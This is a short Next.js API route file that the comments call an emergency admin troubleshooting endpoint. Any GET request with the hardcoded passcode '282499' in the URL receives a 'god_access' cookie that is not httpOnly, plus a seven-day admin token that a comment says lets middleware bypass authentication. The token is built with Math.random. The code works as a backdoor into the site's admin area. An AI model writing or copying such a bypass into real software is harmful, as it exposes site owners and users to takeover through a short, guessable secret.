import { NextRequest, NextResponse } from 'next/server';
import { cookies } from 'next/headers';

// Use a simpler token generation method to avoid Edge Runtime issues
function generateToken(length = 40): string {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let token = '';
  for (let i = 0; i < length; i++) {
    token += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return token;
}

// This is an emergency admin access endpoint for troubleshooting
export async function GET(request: NextRequest) {
  try {
    // Extract passcode from query params
    const passcode = request.nextUrl.searchParams.get('code');
    
    // Check passcode
    if (passcode !== '282499') {
      return NextResponse.json({ error: 'Invalid passcode' }, { status: 401 });
    }
    
    // Generate a special admin token (will be used by middleware to bypass auth)
    const adminToken = generateToken(60);
    
    // Create response
    const response = NextResponse.json({
      success: true,
      message: 'Admin access granted',
      redirectTo: '/admin/dashboard'
    });
    
    // Set cookies for auth bypass
    response.cookies.set({
      name: 'god_access',
      value: 'true',
      httpOnly: false,
      maxAge: 60 * 60 * 24 * 7, // 7 days
      path: '/',
    });
    
    // Set admin token as auth cookie
    response.cookies.set({
      name: 'admin_token',
      value: adminToken,
      httpOnly: true, 
      maxAge: 60 * 60 * 24 * 7, // 7 days
      path: '/',
    });
    
    return response;
  } catch (error) {
    console.error('Admin access error:', error);
    return NextResponse.json({ error: 'Failed to generate admin access' }, { status: 500 });
  }
} 